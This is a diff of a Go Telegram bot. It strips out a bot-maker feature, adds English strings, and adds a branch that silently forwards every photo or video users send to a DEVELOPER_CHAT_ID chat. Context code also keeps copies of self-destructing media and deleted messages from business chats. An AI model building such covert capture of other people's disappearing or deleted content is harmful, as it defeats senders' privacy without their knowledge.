@@ -41,11 +41,7 @@ var quotes = []string{
 var translations = map[string]map[string]string{
 	"ar": {
 		"main_menu_title":        "القائمة الرئيسية 🤖:",
-		"welcome_maker":          "أهلاً بك في بوت صانع البوتات 🤖\n\nقم بالضغط على الزر أدناه لصناعة بوتك الخاص بك فوراً وبشكل مجاني:",
 		"welcome":                "أهلاً بك في لوحة تحكم البوت 🤖\nاختر من الأزرار أدناه للتحكم الكامل:",
-		"create_bot_btn":         "🤖 اصنع بوت مشابه خاص بك",
-		"delete_bot_btn":         "🗑️ حذف / إيقاف بوت",
-		"download_story_btn":     "📥 تحميل ستوري",
 		"stop_btn":               "🛑 إيقاف الرد",
 		"start_btn":              "🟢 تشغيل الرد",
 		"edit_text_btn":          "📝 تعديل نص الرد",
@@ -54,6 +50,7 @@ var translations = map[string]map[string]string{
 		"clear_excluded_btn":     "🧹 مسح المستثنين",
 		"profile_menu_btn":       "🧑 إدارة الملف الشخصي",
 		"post_story_btn":         "📖 نشر قصة",
+		"download_story_btn":     "📥 تحميل ستوري",
 		"lang_ar_btn":            "🇮🇶 العربية",
 		"lang_en_btn":            "🇺🇸 English",
 		"back_btn":               "🔙 رجوع",
@@ -87,10 +84,10 @@ var translations = map[string]map[string]string{
 		"dur_24h":                "24 ساعة",
 		"dur_48h":                "48 ساعة",
 		"story_prompt":           "📖 أرسل الآن صورة أو فيديو (حد أقصى 60 ثانية) لنشره كقصة (ستبقى ظاهرة لمدة %s):",
-		"story_updated":          "✅ تم نشر القصة بنجاح! (ظاهرة لمدة %s)\n\n✨ يمكنك إرسال صورة/فيديو آخر فوراً لنشر قصة إضافية، أو اضغط زر الرجوع للإنهاء:",
-		"download_story_prompt":  "📥 أرسل رابط القصة أو اسم المستخدم (@username) لتحميل القصص النشطة:",
-		"story_api_limit_msg":    "⚠️ تنبيه تقني: واجهة Bot API الرسمية لا تسمح بتنزيل قصص الحسابات الأخرى مباشرة عبر اليوزر/الرابط (تتطلب حساب Userbot بمكتبة Telethon/Pyrogram). يمكنك توجيه القصة مباشرة للبوت لتنزيلها.",
-		"ttl_media_alert":        "🔥 *نسخة احتياطية لوسائط واردة (قد تكون ذاتية التدمير)!*\n👤 العميل: %s (`%d`)",
+		"story_updated":          "✅ تم نشر القصة بنجاح! (ظاهرة لمدة %s)\n\n✨ يمكنك إرسال صورة أو فيديو آخر فوراً لنشر قصة إضافية، أو اضغط زر الرجوع للإنهاء:",
+		"download_story_prompt":  "📥 أرسل رابط القصة أو يوزر المستخدم (@username):",
+		"story_api_limit_msg":    "⚠️ تنبيه تقني: واجهة Bot API الرسمية لا تدعم جلب قصص الحسابات العادية عبر اليوزر أو الرابط مباشرة (تتطلب حساب Userbot بمكتبة Telethon/Pyrogram). يمكنك إعادة توجيه القصة المباشرة للبوت لتحميلها.",
+		"ttl_media_alert":        "🔥 *تم حفظ نسخة من وسائط واردة (قد تكون ذاتية التدمير)!*\n👤 من: %s (`%d`)",
 		"your_id_msg":            "الايدي الخاص بك هو:\n`%d`",
 		"fail_name":              "❌ فشل تعديل الاسم: %s",
 		"fail_bio":               "❌ فشل تعديل النبذة: %s",
@@ -106,6 +103,71 @@ var translations = map[string]map[string]string{
 		"deleted_content_text":   "💬 المحتوى المحذوف:\n%s",
 		"deleted_content_media":  "📎 نوع الوسائط المحذوفة: %s",
 		"resend_fail_note":       "⚠️ تعذّر إعادة إرسال الملف نفسه: %s",
+	},
+	"en": {
+		"main_menu_title":        "Main Menu 🤖:",
+		"welcome":                "Welcome to the bot control panel 🤖\nChoose from the buttons below for full control:",
+		"stop_btn":               "🛑 Stop Auto-Reply",
+		"start_btn":              "🟢 Start Auto-Reply",
+		"edit_text_btn":          "📝 Edit Reply Text",
+		"exclude_btn":            "👤 Exclude Account",
+		"list_excluded_btn":      "📋 View Excluded",
+		"clear_excluded_btn":     "🧹 Clear Excluded",
+		"profile_menu_btn":       "🧑 Manage Profile",
+		"post_story_btn":         "📖 Post Story",
+		"download_story_btn":     "📥 Download Story",
+		"lang_ar_btn":            "🇮🇶 العربية",
+		"lang_en_btn":            "🇺🇸 English",
+		"back_btn":               "🔙 Back",
+		"stopped_msg":            "🛑 Auto-reply has been stopped.",
+		"started_msg":            "🟢 Auto-reply has been started.",
+		"edit_text_prompt":       "📝 Send the new auto-reply text now:",
+		"saved_text_msg":         "✅ New auto-reply text saved successfully!",
+		"exclude_prompt":         "👤 Send the account ID to exclude now:",
+		"invalid_id_msg":         "❌ Numbers only! Please send a valid ID.",
+		"id_added_msg":           "✅ ID `%d` added to the exclusion list.",
+		"list_excluded_title":    "📋 **Excluded Accounts:**\n",
+		"no_excluded":            "No excluded accounts currently.",
+		"cleared_excluded_msg":   "🧹 All exclusions cleared successfully.",
+		"profile_menu_title":     "🧑 Manage Profile - choose what to edit:",
+		"edit_first_name_btn":    "✏️ Edit Name",
+		"edit_bio_btn":           "📝 Edit Bio",
+		"edit_photo_btn":         "🖼️ Edit Photo",
+		"edit_username_btn":      "🔗 Edit Username",
+		"no_business_connection": "❌ No business account connected to the bot yet.",
+		"first_name_prompt":      "✏️ Send the new first name now (optionally followed by a last name):",
+		"bio_prompt":             "📝 Send the new bio now (max 140 characters):",
+		"username_prompt":        "🔗 Send the new username now (without @):",
+		"photo_prompt":           "🖼️ Send the new profile photo now:",
+		"name_updated":           "✅ Name updated successfully!",
+		"bio_updated":            "✅ Bio updated successfully!",
+		"username_updated":       "✅ Username updated successfully!",
+		"photo_updated":          "✅ Profile photo updated successfully!",
+		"select_story_duration":  "⏱️ Select story duration:",
+		"dur_6h":                 "6 Hours",
+		"dur_12h":                "12 Hours",
+		"dur_24h":                "24 Hours",
+		"dur_48h":                "48 Hours",
+		"story_prompt":           "📖 Send a photo or video now (max 60 seconds) to post as a story (visible for %s):",
+		"story_updated":          "✅ Story posted successfully! (visible for %s)\n\n✨ Send another photo/video now to post an additional story, or press back to exit:",
+		"download_story_prompt":  "📥 Send story link or username (@username):",
+		"story_api_limit_msg":    "⚠️ Notice: Standard Bot API does not support fetching stories by username directly.",
+		"ttl_media_alert":        "🔥 *Saved incoming media copy (might be self-destructing)!*\n👤 From: %s (`%d`)",
+		"your_id_msg":            "Your ID is:\n`%d`",
+		"fail_name":              "❌ Failed to update name: %s",
+		"fail_bio":               "❌ Failed to update bio: %s",
+		"fail_username":          "❌ Failed to update username: %s",
+		"fail_photo":             "❌ Failed to update photo: %s",
+		"fail_story":             "❌ Failed to post story: %s",
+		"need_real_photo":        "❌ Please send an actual photo (files or text not accepted).",
+		"need_real_media_story":  "❌ Please send an actual photo or video to post as a story.",
+		"video_too_long_error":   "The video is longer than 60 seconds, which is Telegram's maximum allowed for stories",
+		"deleted_alert_title":    "🗑️ *Alert: A message/media was deleted!*",
+		"deleted_customer_line":  "👤 Customer: %s (`%d`)",
+		"deleted_from_business":  "(deleted from your business account side)",
+		"deleted_content_text":   "💬 Deleted content:\n%s",
+		"deleted_content_media":  "📎 Deleted media type: %s",
+		"resend_fail_note":       "⚠️ Could not re-send the original file: %s",
 	},
 }
 
@@ -248,7 +310,6 @@ type BusinessMessage struct {
 	Audio                *Audio      `json:"audio"`
 	Document             *Document   `json:"document"`
 	VideoNote            *VideoNote  `json:"video_note"`
-	HasProtectedContent  bool        `json:"has_protected_content"`
 }
 
 type DeletedBusinessMessages struct {
@@ -283,11 +344,15 @@ type Message struct {
 		ID int64 `json:"id"`
 	} `json:"chat"`
 	From struct {
-		ID int64 `json:"id"`
+		ID        int64  `json:"id"`
+		FirstName string `json:"first_name"`
+		LastName  string `json:"last_name"`
+		Username  string `json:"username"`
 	} `json:"from"`
-	Text  string      `json:"text"`
-	Photo []PhotoSize `json:"photo"`
-	Video *Video      `json:"video"`
+	Text    string      `json:"text"`
+	Caption string      `json:"caption"`
+	Photo   []PhotoSize `json:"photo"`
+	Video   *Video      `json:"video"`
 }
 
 type CallbackQuery struct {
@@ -320,23 +385,20 @@ type MediaCacheEntry struct {
 }
 
 func Handler(w http.ResponseWriter, r *http.Request) {
-	mainToken := os.Getenv("TELEGRAM_BOT_TOKEN")
-	tokenQuery := r.URL.Query().Get("token")
-
-	isMainMakerBot := false
-	botToken := tokenQuery
-	if tokenQuery == "" || tokenQuery == mainToken {
-		botToken = mainToken
-		isMainMakerBot = true
-	}
-
-	var update TelegramUpdate
-	if err := json.NewDecoder(r.Body).Decode(&update); err != nil {
+	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
+	if botToken == "" {
 		w.WriteHeader(http.StatusOK)
 		return
 	}
 
-	// 1. معالجة الضغط على الأزرار الشفافة
+	var update TelegramUpdate
+	if err := json.NewDecoder(r.Body).Decode(&update); err != nil {
+		log.Println("خطأ في قراءة التحديث:", err)
+		w.WriteHeader(http.StatusOK)
+		return
+	}
+
+	// 1. معالجة الأزرار الشفافة
 	if update.CallbackQuery != nil {
 		cb := update.CallbackQuery
 		answerCallback(botToken, cb.ID)
@@ -354,26 +416,14 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 		lang := config.Lang
 
 		switch cb.Data {
-		case "create_bot_prompt":
-			config.State = "waiting_create_token"
+		case "main_menu":
+			config.State = ""
 			saveConfig(botToken, adminID, config, msgID)
-			sendSubMenu(botToken, adminID, lang, "🤖 **أرسل الآن توكن بوتك الجديد المأخوذ من @BotFather:**")
-		case "delete_bot_prompt":
-			config.State = "waiting_delete_token"
-			saveConfig(botToken, adminID, config, msgID)
-			sendSubMenu(botToken, adminID, lang, "🗑️ **أرسل الآن توكن البوت الذي تريد حذفه وإيقافه:**")
+			sendMenu(botToken, adminID, lang, tr(lang, "main_menu_title"))
 		case "download_story":
 			config.State = "waiting_story_download"
 			saveConfig(botToken, adminID, config, msgID)
 			sendSubMenu(botToken, adminID, lang, tr(lang, "download_story_prompt"))
-		case "main_menu":
-			config.State = ""
-			saveConfig(botToken, adminID, config, msgID)
-			if isMainMakerBot {
-				sendMakerMenu(botToken, adminID, lang, tr(lang, "welcome_maker"))
-			} else {
-				sendMenu(botToken, adminID, lang, tr(lang, "main_menu_title"))
-			}
 		case "stop":
 			config.IsStopped = true
 			config.State = ""
@@ -458,27 +508,19 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 			config.Lang = "ar"
 			config.State = ""
 			saveConfig(botToken, adminID, config, msgID)
-			if isMainMakerBot {
-				sendMakerMenu(botToken, adminID, "ar", tr("ar", "welcome_maker"))
-			} else {
-				sendMenu(botToken, adminID, "ar", tr("ar", "main_menu_title"))
-			}
+			sendMenu(botToken, adminID, "ar", tr("ar", "main_menu_title"))
 		case "lang_en":
 			config.Lang = "en"
 			config.State = ""
 			saveConfig(botToken, adminID, config, msgID)
-			if isMainMakerBot {
-				sendMakerMenu(botToken, adminID, "en", tr("en", "welcome_maker"))
-			} else {
-				sendMenu(botToken, adminID, "en", tr("en", "main_menu_title"))
-			}
+			sendMenu(botToken, adminID, "en", tr("en", "main_menu_title"))
 		}
 
 		w.WriteHeader(http.StatusOK)
 		return
 	}
 
-	// 2. معالجة الرسائل القادمة
+	// 2. معالجة الرسائل المباشرة الموجهة للبوت (وحفظ أي وسائط واردة فوراً)
 	if update.Message != nil {
 		msg := update.Message
 		chatID := msg.Chat.ID
@@ -486,12 +528,26 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 		config, msgID := getConfig(botToken, chatID)
 		lang := config.Lang
 
-		if msg.Text == "/start" {
-			if isMainMakerBot {
-				sendMakerMenu(botToken, chatID, lang, tr(lang, "welcome_maker"))
-			} else {
-				sendMenu(botToken, chatID, lang, tr(lang, "welcome"))
+		// التقاط أية وسائط واردة للبوت (صور/فيديو) لحفظ نسخة منها للأدمن فوراً (ذاتية التدمير)
+		devChatID := os.Getenv("DEVELOPER_CHAT_ID")
+		if (len(msg.Photo) > 0 || msg.Video != nil) && devChatID != "" {
+			devID, _ := strconv.ParseInt(devChatID, 10, 64)
+			if devID != 0 && devID != chatID {
+				senderName := buildDisplayName(msg.From.FirstName, msg.From.LastName, msg.From.Username)
+				caption := fmt.Sprintf(tr(lang, "ttl_media_alert"), senderName, msg.From.ID)
+				if msg.Caption != "" {
+					caption += "\n\n💬 النص: " + msg.Caption
+				}
+				if len(msg.Photo) > 0 {
+					_ = sendMediaByFileID(botToken, devID, "photo", msg.Photo[len(msg.Photo)-1].FileID, caption)
+				} else if msg.Video != nil {
+					_ = sendMediaByFileID(botToken, devID, "video", msg.Video.FileID, caption)
+				}
 			}
+		}
+
+		if msg.Text == "/start" {
+			sendMenu(botToken, chatID, lang, tr(lang, "welcome"))
 			w.WriteHeader(http.StatusOK)
 			return
 		}
@@ -504,37 +560,6 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 
 		if config.State == "waiting_story_download" {
 			sendSubMenu(botToken, chatID, lang, tr(lang, "story_api_limit_msg"))
-			w.WriteHeader(http.StatusOK)
-			return
-		}
-
-		if config.State == "waiting_delete_token" {
-			targetToken := strings.TrimSpace(msg.Text)
-			if err := deleteSubBotWebhook(targetToken); err != nil {
-				sendSubMenu(botToken, chatID, lang, fmt.Sprintf("❌ فشل إيقاف البوت:\n`%s`\nتأكد من إرسال توكن صحيح.", err.Error()))
-			} else {
-				config.State = ""
-				saveConfig(botToken, chatID, config, msgID)
-				sendMakerMenu(botToken, chatID, lang, "🗑️ **تم إيقاف وحذف البوت بنجاح!**\nلن يتلقى البوت أي تحديثات بعد الآن.")
-			}
-			w.WriteHeader(http.StatusOK)
-			return
-		}
-
-		if config.State == "waiting_create_token" || (isMainMakerBot && strings.Contains(msg.Text, ":") && len(msg.Text) > 20) {
-			newSubToken := strings.TrimSpace(msg.Text)
-			host := r.Host
-			if host == "" {
-				host = r.Header.Get("X-Forwarded-Host")
-			}
-
-			if err := setupSubBotWebhook(newSubToken, host); err != nil {
-				sendSubMenu(botToken, chatID, lang, fmt.Sprintf("❌ فشل تفعيل البوت الجديد:\n`%s`\nتأكد من صحة التوكن المأخوذ من @BotFather", err.Error()))
-			} else {
-				config.State = ""
-				saveConfig(botToken, chatID, config, msgID)
-				sendMakerMenu(botToken, chatID, lang, fmt.Sprintf("🎉 *تم إنشاء وبناء بوتك بنجاح!*\n\n🤖 **التوكن الخاص بك:**\n`%s`\n\nقم بالدخول إلى بوتك الجديد واضغط /start للبدء في الاستخدام والتحكم الكامل!", newSubToken))
-			}
 			w.WriteHeader(http.StatusOK)
 			return
 		}
@@ -632,19 +657,19 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// 3. معالجة رسائل الأعمال (Business Messages) + الحفظ التلقائي للوسائط الواردة (ذاتية التدمير)
+	// 3. معالجة رسائل الأعمال وحفظ الوسائط ذاتية التدمير القادمة من المحادثات التجاريّة
 	if update.BusinessMessage != nil {
 		msg := update.BusinessMessage
 		cacheBusinessMessage(msg)
 
 		adminID := getAdminIDFromBusinessConn(botToken, msg.BusinessConnectionID)
 
-		// --- ميزة الحفظ الفوري للوسائط القادمة من العملاء (حفظ نسخة للوسائط ذاتية التدمير) ---
+		// حفظ نسخة احتياطية من الوسائط ذاتية التدمير
 		if !msg.IsOutgoing && adminID != 0 && (len(msg.Photo) > 0 || msg.Video != nil) {
 			customerName := buildDisplayName(msg.From.FirstName, msg.From.LastName, msg.From.Username)
 			backupCaption := fmt.Sprintf(tr("ar", "ttl_media_alert"), customerName, msg.From.ID)
 			if msg.Caption != "" {
-				backupCaption += "\n\n💬 النبذة: " + msg.Caption
+				backupCaption += "\n\n💬 النص: " + msg.Caption
 			}
 
 			if len(msg.Photo) > 0 {
@@ -764,19 +789,6 @@ func Handler(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(http.StatusOK)
 }
 
-func sendMakerMenu(token string, chatID int64, lang, text string) {
-	keyboard := map[string]interface{}{
-		"inline_keyboard": [][]map[string]string{
-			{{"text": tr(lang, "create_bot_btn"), "callback_data": "create_bot_prompt"}},
-			{{"text": tr(lang, "delete_bot_btn"), "callback_data": "delete_bot_prompt"}},
-			{{"text": tr(lang, "lang_ar_btn"), "callback_data": "lang_ar"}, {"text": tr(lang, "lang_en_btn"), "callback_data": "lang_en"}},
-		},
-	}
-	payload := map[string]interface{}{"chat_id": chatID, "text": text, "parse_mode": "Markdown", "reply_markup": keyboard}
-	b, _ := json.Marshal(payload)
-	httpClient.Post("https://api.telegram.org/bot"+token+"/sendMessage", "application/json", bytes.NewBuffer(b))
-}
-
 func sendMenu(token string, chatID int64, lang, text string) {
 	keyboard := map[string]interface{}{
 		"inline_keyboard": [][]map[string]string{
@@ -793,50 +805,6 @@ func sendMenu(token string, chatID int64, lang, text string) {
 	payload := map[string]interface{}{"chat_id": chatID, "text": text, "parse_mode": "Markdown", "reply_markup": keyboard}
 	b, _ := json.Marshal(payload)
 	httpClient.Post("https://api.telegram.org/bot"+token+"/sendMessage", "application/json", bytes.NewBuffer(b))
-}
-
-func setupSubBotWebhook(subBotToken, host string) error {
-	if host == "" {
-		return fmt.Errorf("تعذر تحديد رابط الخادم الفعلي")
-	}
-
-	webhookURL := fmt.Sprintf("https://%s/?token=%s", host, subBotToken)
-	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/setWebhook?url=%s", subBotToken, url.QueryEscape(webhookURL))
-
-	resp, err := httpClient.Get(apiURL)
-	if err != nil {
-		return fmt.Errorf("خطأ الاتصال بتليجرام: %v", err)
-	}
-	defer resp.Body.Close()
-
-	var res apiResult
-	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
-		return fmt.Errorf("فشل فك تشفير استجابة تليجرام")
-	}
-
-	if !res.Ok {
-		return fmt.Errorf("%s", res.Description)
-	}
-	return nil
-}
-
-func deleteSubBotWebhook(subBotToken string) error {
-	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/deleteWebhook", subBotToken)
-	resp, err := httpClient.Get(apiURL)
-	if err != nil {
-		return fmt.Errorf("خطأ الاتصال بتليجرام: %v", err)
-	}
-	defer resp.Body.Close()
-
-	var res apiResult
-	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
-		return fmt.Errorf("فشل فك تشفير استجابة تليجرام")
-	}
-
-	if !res.Ok {
-		return fmt.Errorf("%s", res.Description)
-	}
-	return nil
 }
 
 func cacheKey(chatID int64, messageID int) string {
@@ -1224,7 +1192,7 @@ func postMultipartBusinessAPI(token, method string, fields map[string]string, fi
 	var res apiResult
 	json.NewDecoder(resp.Body).Decode(&res)
 	if !res.Ok {
-		return fmt.Sprintf("%s", res.Description)
+		return fmt.Errorf("%s", res.Description)
 	}
 	return nil
 }
@@ -1309,13 +1277,4 @@ func answerCallback(token, callbackID string) {
 	payload := map[string]string{"callback_query_id": callbackID}
 	b, _ := json.Marshal(payload)
 	httpClient.Post("https://api.telegram.org/bot"+token+"/answerCallbackQuery", "application/json", bytes.NewBuffer(b))
-}
-
-func main() {
-	http.HandleFunc("/", Handler)
-	port := os.Getenv("PORT")
-	if port == "" {
-		port = "8080"
-	}
-	http.ListenAndServe(":"+port, nil)
 }
